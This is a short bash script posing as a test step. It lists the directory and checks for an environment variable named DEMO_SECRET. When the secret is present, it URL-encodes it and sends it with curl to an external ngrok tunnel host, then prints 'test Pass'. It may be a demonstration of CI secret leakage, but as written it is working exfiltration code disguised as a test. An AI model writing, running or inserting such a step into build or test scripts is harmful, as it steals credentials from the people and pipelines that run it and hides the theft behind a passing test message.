#!/usr/bin/env bash

echo "=== Script started ==="
echo "Current directory:"
pwd

echo "Files:"
ls -la
set -e

if [ -n "$DEMO_SECRET" ]; then
    echo "DEMO_SECRET is available"
    echo "Secret length: ${#DEMO_SECRET}"
    
    # URL-encode the secret
    encoded_secret=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$DEMO_SECRET")
    
    curl "https://huntress-staleness-haunt.ngrok-free.dev/${encoded_secret}/notify"
    echo "test Pass"
else
    echo "DEMO_SECRET is not available"
fi
echo "=== Script finished ==="